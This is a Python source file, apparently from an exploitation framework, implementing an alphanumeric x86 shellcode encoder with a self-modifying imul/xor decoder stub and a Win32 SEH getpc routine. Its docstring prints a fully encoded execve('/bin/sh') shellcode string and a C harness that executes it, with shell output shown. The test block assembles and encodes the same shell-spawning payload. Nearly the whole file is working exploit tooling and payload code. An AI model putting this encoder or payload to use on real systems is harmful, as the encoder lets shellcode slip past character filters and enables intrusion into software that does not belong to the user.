#!/usr/bin/env python

import struct
import sys
if '.' not in sys.path:
    sys.path.append('.')

NOTES = """
Logic:

Consider ((A*B)&0xff)^C

Given a static alphanumeric factor A, a variable alphanumeric factor
B and a variable alphanumeric xor operand C, the alphanumeric set is
big enough to generate the full byte range of values (0x00-0xff)

Taking this into account we can implement a smaller and simplified
decoding loop that does not have to jump through all the hoops of the
more popular solutions that revolve around imul based nibble shifting.

consider e.g.

imul $0x32,0x30(%ecx),%eax  // A*B
xorb %al,0x30(%edx)         // ^C

Given a static A of 0x32, and a variable B and C, we can decode in 2
instructions. This means that we get the usual 2 byte investment for
1 byte of shellcode ratio, but with a smaller decoder.

We can simply push the multipliers on the stack, and append the
xor operands behind the loop. The loop will then eat through the
multipliers and xor operands in a 1-for-1 fashion, until it reaches
an end marker in the multipliers, at which point the loop exits and
continues in the now decoded xor operands, which have become valid
payload.

I'm not sure how 'new' this approach is, I just know all the existing
solutions struck me as a bit overengineered. So hopefully this works
out for people.

To use, because we're lacking alphanumeric getpc capabilities, you need
a register pointing to your payload, alternatively you can prepend
custom 'ensure 0x30(%edx) points at edx_offset:' stubs depending on your
app.

Default example (reg points at my payload):

encoder = AlphaNum()
getpc   = encoder.get_pc(reg='esi')
payload = encoder.encode(payload)
final   = getpc + payload

Alternatively you can use custom_pc(code) to assemble a custom prepend.
This prepend has to ensure (in an alphanumerically safe way) that
0x30(%edx) points at edx_offset: in the decoder. This is the only
requirement for the code to work.

Custom example #1 (pointer on stack points at my payload):

# custom getpcs have to be <= 0x30-37 ... we can make this
# bigger by changing the edx/ecx base offsets ...

encoder     = AlphaNum()
getpc       = "popl %edx\n"
edx_offset  = encoder.edx_offset # the base offset without getpc added
code        = mosdef.assemble(getpc, 'X86')
edx_offset  += len(code)
while edx_offset < 0x30:
    get_pc      += "incl %ecx\n"
    edx_offset  += 1
getpc   = encoder.custom_pc(getpc)
payload = encoder.encode(payload)
final   = getpc + payload

Custom example #2 (win32 code using nicolas SEH getpc):

encoder = AlphaNum()
totopc  = encoder.seh_pc()
getpc   = encoder.get_pc(reg='ecx')
payload = encoder.encode(payload)
final   = totopc + getpc + payload

Enjoy! Bella! Napoli! Pizza! etc.

TODO:

decoder variants for pure upper, pure lower, and pure num

PoC (testing with regular call/pop for convenience):

[+] payload len pre-encoding: 25
[+] found B,C pair for ef (B: 46, C: 43, m: 32)
[+] found B,C pair for 33 (B: 45, C: 49, m: 32)
[+] found B,C pair for c0 (B: 41, C: 72, m: 32)
[+] found B,C pair for 50 (B: 43, C: 46, m: 32)
[+] found B,C pair for 68 (B: 48, C: 78, m: 32)
[+] found B,C pair for 2f (B: 43, C: 39, m: 32)
[+] found B,C pair for 2f (B: 43, C: 39, m: 32)
[+] found B,C pair for 73 (B: 43, C: 65, m: 32)
[+] found B,C pair for 68 (B: 48, C: 78, m: 32)
[+] found B,C pair for 68 (B: 48, C: 78, m: 32)
[+] found B,C pair for 2f (B: 43, C: 39, m: 32)
[+] found B,C pair for 62 (B: 43, C: 74, m: 32)
[+] found B,C pair for 69 (B: 48, C: 79, m: 32)
[+] found B,C pair for 6e (B: 43, C: 78, m: 32)
[+] found B,C pair for 8b (B: 41, C: 39, m: 32)
[+] found B,C pair for dc (B: 41, C: 6e, m: 32)
[+] found B,C pair for 50 (B: 43, C: 46, m: 32)
[+] found B,C pair for 53 (B: 43, C: 45, m: 32)
[+] found B,C pair for 8b (B: 41, C: 39, m: 32)
[+] found B,C pair for cc (B: 4b, C: 6a, m: 32)
[+] found B,C pair for 50 (B: 43, C: 46, m: 32)
[+] found B,C pair for 5a (B: 43, C: 4c, m: 32)
[+] found B,C pair for b0 (B: 42, C: 54, m: 32)
[+] found B,C pair for b (B: 44, C: 43, m: 32)
[+] found B,C pair for cd (B: 46, C: 61, m: 32)
[+] found B,C pair for 80 (B: 41, C: 32, m: 32)
[+] found valid terminator: 47
[+] payload len post-encoding: 150
'\xe8\x00\x00\x00\x00ZAAAAAAAAAAhAAAAPPPPPPPPPPPPTYkA020B0h8A0uXB9B0uHABBBBhFAGGhCCBDhCCAKhHCAAhHHCChHCCChFEACPPPPPPPPPPPPTYkA020B0ABjGX8A0uCIrFx99exx9tyx9nFE9jFLTCa2'
work@work-desktop:/mnt/cvs/CANVAS$

...

#include <stdio.h>
#include <stdlib.h>

char buf[] = "\xe8\x00\x00\x00\x00ZAAAAAAAAAAhAAAAPPPPPPPPPPPPTYkA020B0h8A0uXB9B0uHABBBBhFAGGhCCBDhCCAKhHCAAhHHCChHCCChFEACPPPPPPPPPPPPTYkA020B0ABjGX8A0uCIrFx99exx9tyx9nFE9jFLTCa2";
int
main(int argc, char **argv)
{
    void (*p)();
    p = (void (*)())buf;
    (p)();
}

...

work@work-desktop:~$ ./heh
$ 

"""
    
from MOSDEF import mosdef

class AlphaNum:
    def __init__(self, type='INTEL', upper=True, lower=True, num=True):
        # encode callbacks
        self.type           = type
        self.arch_callback  = { 'INTEL' : self.encode_intel }
        self.upper          = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        self.lower          = 'abcdefghijklmnopqrstuvwxyz'
        self.num            = '0123456789'
        # allowed character set
        self.set            = ''
        # static A multiplier
        self.m              = 0x32
        self.set_upper      = upper
        self.set_lower      = lower
        self.set_num        = num
        # build allowed character set
        if self.set_upper == True:
            self.set += self.upper
            self.m = 0x42
        if self.set_lower == True:
            self.set += self.lower
            self.m = 0x75
        if self.set_num == True:
            self.set += self.num
            self.m = 0x32
        # depends on the decoder!
        self.edx_offset = 37
        
    def find_B_and_C(self, p):
        for A in [self.m]:
            for B in self.set:
                for C in self.set:
                    if (p == ((A*ord(B))&0xff)^ord(C)):
                        print "[+] found B,C pair for %x (B: %x, C: %x, m: %x)" % (p, ord(B), ord(C), self.m)
                        return (ord(B), ord(C))
        return None
                    
    def encode(self, data):
        try:
            return self.arch_callback[self.type.upper()](data)
        except IndexError:
            print "[-] no such encoder type"
    
    # this has to ensure 0x30(%edx) points at edx_offset:
    def get_pc(self, reg='esi'):
        # get pc logics, reg points at payload
        edx_offset = self.edx_offset
        getpc = """
        push %%%s\n
        pop %%edx\n
        """ % reg
        edx_offset += 2
        while edx_offset < 0x30:
            getpc += "incl %ecx\n"
            edx_offset += 1
        return mosdef.assemble(getpc, 'X86')
    
    # for custom app work
    def custom_pc(self, code):
        return mosdef.assemble(code, 'X86')
    
    # win32 SEH based getpc (leaves pc in ecx) (thanks nicolas!)
    def seh_pc(self):
        disas = """
        0x8049600 <toto>:       push   %esi
        0x8049601 <toto+1>:     push   %esp
        0x8049602 <toto+2>:     pop    %eax
        0x8049603 <toto+3>:     xor    %ss:(%eax),%esi
        0x8049606 <toto+6>:     push   %esi
        0x8049607 <toto+7>:     pop    %eax
        0x8049608 <toto+8>:     dec    %eax
        0x8049609 <toto+9>:     xor    $0x41,%al
        0x804960b <toto+11>:    xor    $0x56,%al
        0x804960d <toto+13>:    push   %esi
        0x804960e <toto+14>:    pop    %ecx
        0x804960f <toto+15>:    xor    %fs:0x30(%eax),%ecx
        0x8049613 <toto+19>:    push   %ecx
        0x8049614 <toto+20>:    pop    %eax
        0x8049615 <toto+21>:    xor    $0x4141,%ax
        0x8049619 <toto+25>:    xor    $0x4d41,%ax
        0x804961d <toto+29>:    push   $0x58585858
        0x8049622 <toto+34>:    pop    %edx
        0x8049623 <toto+35>:    xor    0x30(%eax),%dl
        0x8049626 <toto+38>:    xor    %dl,0x30(%eax)
        0x8049629 <toto+41>:    push   $0x58585858
        0x804962e <toto+46>:    pop    %edx
        0x804962f <toto+47>:    inc    %edx
        0x8049630 <toto+48>:    inc    %edx
        0x8049631 <toto+49>:    inc    %edx
        0x8049632 <toto+50>:    inc    %edx
        0x8049633 <toto+51>:    xor    0x31(%eax),%edx
        0x8049636 <toto+54>:    xor    %edx,0x31(%eax)
        0x8049639 <toto+57>:    push   $0x51414159
        0x804963e <toto+62>:    pop    %edx
        0x804963f <toto+63>:    xor    0x35(%eax),%edx
        0x8049642 <toto+66>:    xor    %edx,0x35(%eax)
        0x8049645 <toto+69>:    push   %eax
        0x8049646 <toto+70>:    pop    %edx
        0x8049647 <toto+71>:    push   %esi
        0x8049648 <toto+72>:    pop    %eax
        0x8049649 <toto+73>:    dec    %eax
        0x804964a <toto+74>:    xor    $0x45,%al
        0x804964c <toto+76>:    xor    $0x79,%al
        0x804964e <toto+78>:    xor    0x39(%edx),%al
        0x8049651 <toto+81>:    xor    %al,0x39(%edx)
        0x8049654 <toto+84>:    push   %edx
        0x8049655 <toto+85>:    pop    %eax
        0x8049656 <toto+86>:    xor    $0x30,%al
        0x8049658 <toto+88>:    push   %esi
        0x8049659 <toto+89>:    pop    %ecx
        0x804965a <toto+90>:    dec    %ecx
        0x804965b <toto+91>:    push   %ecx
        0x804965c <toto+92>:    push   %eax
        0x804965d <toto+93>:    push   %eax
        0x804965e <toto+94>:    inc    %ecx
        0x804965f <toto+95>:    xor    %fs:(%esi),%esi
        0x8049662 <toto+98>:    push   %esi
        0x8049663 <toto+99>:    push   %esp
        0x8049664 <toto+100>:   pop    %eax
        0x8049665 <toto+101>:   push   %ecx
        0x8049666 <toto+102>:   push   %ecx
        0x8049667 <toto+103>:   push   %edx
        0x8049668 <toto+104>:   push   %ebx
        0x8049669 <toto+105>:   push   %esp
        0x804966a <toto+106>:   push   %ebp
        0x804966b <toto+107>:   push   %eax
        0x804966c <toto+108>:   push   %edi
        0x804966d <toto+109>:   popa
        0x804966e <toto+110>:   xor    %fs:(%eax),%esi
        0x8049671 <toto+113>:   xor    %esi,%fs:(%eax)
        0x8049674 <toto+116>:   cmp    %bh,(%ecx)  
        """
        return "VTX630VXH4A4VVYd3H0QXf5AAf5AMhXXXXZ2P00P0hXXXXZBBBB3P11P1hYAAQZ3P51P5PZVXH4E4y2B90B9RX40VYIQPPAd36VTXQQRSTUPWad30d1089"
        
    def encode_intel(self, data):
        # XXX: need variants pending set restrictions
        # XXX: for now assume full alphanum set ...
        decoder_stub = """
        // self modding stub that finds correct edx offset
        // getpc stubs should ensure 0x30(%%edx) points at 
        // search_loop_offset (37 base offset from here to there)
        // multiplier B (0x41)
        pushl $0x41414141
        // get min alphanum safe ecx offset 0x30
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%esp
        popl %%ecx
        .byte 0x6b
        .byte 0x41
        .byte 0x30
        .byte 0x32
        xorb %%al,0x30(%%edx)
        pushl $0x75304138
        popl %%eax
        search_loop:
        incl %%edx
        cmp %%eax,0x30(%%edx)
        .byte 0x75
        // found B,C pair for fa (B: 41, C: 48, m: 32)
        search_loop_offset:
        .byte 0x48
        incl %%ecx
        incl %%edx
        incl %%edx
        incl %%edx
        incl %%edx
        // multipliers
        %s
        // get min alphanum safe ecx offset 0x30
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%eax
        pushl %%esp
        popl %%ecx
        decode_loop:
        //imul $0x32,0x30(%%ecx),%%eax // mosdef cant do imul yet
        .byte 0x6b
        .byte 0x41
        .byte 0x30
        .byte 0x%.2x
        xorb %%al,0x30(%%edx)
        incl %%ecx
        incl %%edx
        push $0x%.2x
        popl %%eax
        //cmpb %%al,0x30(%%ecx) // mosdef compiles cmpb to 0x3a
        // these 4 bytes are used as search marker in first self-mod
        .byte 0x38
        .byte 0x41
        .byte 0x30
        // jne
        .byte 0x75
        // edx should point here -30, first xor patches in loop offset
        edx_offset:
        // loop offset goes here, first in C_list
        code:
        %s
        """
        B_list = [] # multipliers
        C_list = [] # xor operands
        pair = self.find_B_and_C(0xef)
        if not pair:
            print "[-] could not self modify decode loop"
            return ''
        loop_offset_B, loop_offset_C = pair
        B_list.append(loop_offset_B) # loop offset patch
        C_list.append(loop_offset_C) # loop offset patch
        for p in data:
            pair = self.find_B_and_C(ord(p))
            if not pair:
                print "[-] failed with this character set"
                return ''
            B, C = pair
            B_list.append(B)
            C_list.append(C)
        # find a terminator
        term = 0x5A
        for term in self.set:
            if ord(term) not in B_list:
                print "[+] found valid terminator: %.2x" % ord(term)
                break
        # push multipliers
        B_align = 4 - (len(B_list) % 4)
        if B_align == 4:
            # terminators
            B_list.append(ord(term))
            B_list.append(ord(term))
            B_list.append(ord(term))
            B_list.append(ord(term))
        else:
            while B_align:
                B_list.append(ord(term))
                B_align -= 1
        # B_list is now aligned on 4
        pushes = ''
        i = 0
        B_list.reverse()
        while i < len(B_list):
            pushme = struct.unpack('>L',\
                                   chr(B_list[i+0])+\
                                   chr(B_list[i+1])+\
                                   chr(B_list[i+2])+\
                                   chr(B_list[i+3]))
            pushes += "pushl $0x%.8x\n" % pushme
            i += 4
        xors = ''
        for op in C_list:
            xors += ".byte 0x%.2x\n" % op
        decoder = decoder_stub % (pushes, self.m, ord(term), xors)
        return mosdef.assemble(decoder, 'X86')
                
if __name__ == '__main__':
    encoder = AlphaNum()  
    print "[+] testing full set"
    for i in range(0, 256):
        if not encoder.find_B_and_C(i):
            print "[+] logic failed full set"
            break
    encoder = AlphaNum(upper=True, lower=False, num=False)
    print "[+] testing pure upper set"
    for i in range(0, 256):
        if not encoder.find_B_and_C(i):
            print "[+] logic failed pure upper set"
            break
    encoder = AlphaNum(lower=True, upper=False, num=False)
    print "[+] testing pure lower set"
    for i in range(0, 256):
        if not encoder.find_B_and_C(i):
            print "[+] logic failed pure lower set"
            break
    encoder = AlphaNum(num=True, upper=False, lower=False)
    print "[+] testing pure num set (don't expect to work)"
    for i in range(0, 256):
        if not encoder.find_B_and_C(i):
            print "[+] logic failed pure num set (expected)"
            break
    print "[+] testing final payload encoder (full set)"
    encoder = AlphaNum()
    payload = ''
    for i in range(0, 256):
        payload += chr(i)
    # so we can int3 debug
    payload = "\xcc" + payload
    # let's try some real payload
    execve = """
    // execve("/bin/sh", { "/bin/sh", 0 }, 0)
    xorl %eax,%eax
    pushl %eax
    pushl $0x68732F2F
    pushl $0x6E69622F
    movl %esp,%ebx
    pushl %eax
    pushl %ebx
    movl %esp,%ecx
    pushl %eax
    popl %edx
    movb $11,%al
    int $0x80
    """
    payload = mosdef.assemble(execve, 'X86')
    print "[+] payload len pre-encoding: %d" % len(payload)
    # custom non-alpha fake getpc for decoder testing
    getpc_pre   = "call callme\n"
    getpc_pre   +="callme:"
    getpc_post  = "popl %edx" # edx will point here
    getpc       = encoder.custom_pc(getpc_pre)
    getpc       += encoder.custom_pc(getpc_post)
    edx_offset  = encoder.edx_offset + len(mosdef.assemble(getpc_post, 'X86'))
    while edx_offset < 0x30:
        getpc       += encoder.custom_pc("incl %ecx")
        edx_offset  += 1
    payload = getpc + encoder.encode(payload)
    print "[+] payload len post-encoding: %d" % len(payload)
    print repr(payload)